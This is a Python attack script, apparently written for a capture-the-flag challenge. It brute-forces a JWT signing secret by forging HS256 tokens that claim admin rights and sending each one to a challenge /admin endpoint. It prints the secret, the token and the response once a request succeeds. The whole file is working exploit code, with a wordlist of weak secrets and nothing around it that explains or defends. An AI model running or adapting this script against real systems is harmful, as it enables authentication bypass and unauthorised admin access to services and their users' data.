import jwt
import requests

# Target URL
url = "http://chall-35fd4744.evt-246.glabs.ctf7.com/admin"

# Payload (we escalate to admin)
payload = {
    "sub": "admin",
    "role": "admin"
}

# Strong wordlist for weak secrets
secrets = [
    "secret123", "WukKkpRPiJW4QatR9HnfsV4fcZk=", "ZéO¸A«Qôyß±^q", "WukKkpRPiJW4QatR9HnfsV4fcZk", "admin", "password", "guest",
    "jwtsecret", "key", "123456", "qwerty",
    "letmein", "ctf", "ctf7", "staff",
    "dashboard", "auth", "webtoken",
    "jwt", "supersecret", "verysecret", "changeme"
]

for s in secrets:
    try:
        token = jwt.encode(payload, s, algorithm="HS256")

        headers = {
            "Authorization": f"Bearer {token}"
        }

        r = requests.get(url, headers=headers)

        print(f"Trying: {s} → Status: {r.status_code}")

        # Success condition
        if r.status_code == 200:
            print("\n🔥 SUCCESS!")
            print("SECRET:", s)
            print("TOKEN:", token)
            print("RESPONSE:\n", r.text)
            break

    except Exception as e:
        print("Error:", e)